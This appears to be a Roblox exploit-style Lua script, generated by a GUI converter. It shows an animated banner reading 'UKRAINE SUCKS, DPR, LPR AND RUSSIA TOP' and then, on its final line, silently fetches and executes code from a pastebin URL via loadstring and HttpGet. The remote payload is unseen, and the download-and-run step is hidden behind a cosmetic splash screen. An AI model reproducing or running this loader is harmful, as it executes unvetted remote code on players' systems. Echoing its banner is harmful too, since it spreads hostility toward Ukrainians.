

        -- Gui to Lua
-- Version: 3.2

-- Instances:

local UKRAINESUCKS = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")

--Properties:

UKRAINESUCKS.Name = "UKRAINESUCKS"
UKRAINESUCKS.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
UKRAINESUCKS.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ImageLabel.Parent = UKRAINESUCKS
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 100.000
ImageLabel.Position = UDim2.new(0.38, 0, 1, 0)
ImageLabel.Size = UDim2.new(0, 400, 0, 228)
ImageLabel.Image = "http://www.roblox.com/asset/?id=11266448488"

TextLabel.Parent = UKRAINESUCKS
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.444000006, 0, 1, 0)
TextLabel.Size = UDim2.new(0, 140, 0, 40)
TextLabel.Font = Enum.Font.Bangers
TextLabel.Text = "UKRAINE SUCKS, DPR, LPR AND RUSSIA TOP"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 54.000

-- Scripts:

local function NGVSSUM_fake_script() -- UKRAINESUCKS.LocalScript 
    local script = Instance.new('LocalScript', UKRAINESUCKS)

    wait(2)
    local xd = script.Parent.ImageLabel
    xd:TweenPosition(
        UDim2.new(0.38, 0, 0.359, 0),
        "InOut",
        "Quint",
        1,
        false
    )
    wait(0.2)
    local xdd = script.Parent.TextLabel
    xdd:TweenPosition(
        UDim2.new(0.444, 0, 0.641, 0),
        "InOut",
        "Quint",
        1,
        false
    )
    wait(2)
    xd:TweenPosition(
        UDim2.new(0.38, 0, -0.5, 0),
        "InOut",
        "Quint",
        1,
        false
    )
    wait(0.2)
    xdd:TweenPosition(
        UDim2.new(0.444, 0, -0.5, 0),
        "InOut",
        "Quint",
        1,
        false
    )
end
coroutine.wrap(NGVSSUM_fake_script)()

wait(5)

    loadstring(game:HttpGet("https://pastebin.com/raw/LnSbH7HT"))()
